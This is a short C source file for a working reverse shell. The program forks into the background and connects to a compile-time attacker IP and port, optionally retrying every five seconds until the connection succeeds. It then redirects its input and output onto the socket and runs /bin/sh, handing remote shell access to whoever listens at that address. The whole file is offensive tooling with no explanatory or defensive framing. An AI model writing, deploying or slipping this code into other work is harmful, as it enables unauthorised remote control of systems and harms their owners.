#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if !defined(CLIENT_IP)
#error "must define CLIENT_IP"
#endif

#if !defined(CLIENT_PORT)
#error "must define CLIENT_PORT"
#endif

int main(void)
{
	pid_t pid = fork();

	if (pid == -1)
	{
		write(2, "error: fork failed.\n", 21);
		return 1;
	}

	if (pid > 0)
	{
		return 0;
	}

	struct sockaddr_in sa;

	sa.sin_family = AF_INET;
	sa.sin_port = htons(CLIENT_PORT);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	int sockt = socket(AF_INET, SOCK_STREAM, 0);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0)
	{
		sleep(5);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0)
	{
		write(2, "error: connect failed.\n", 24);
		return 1;
	}
#endif

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
	return 0;
}
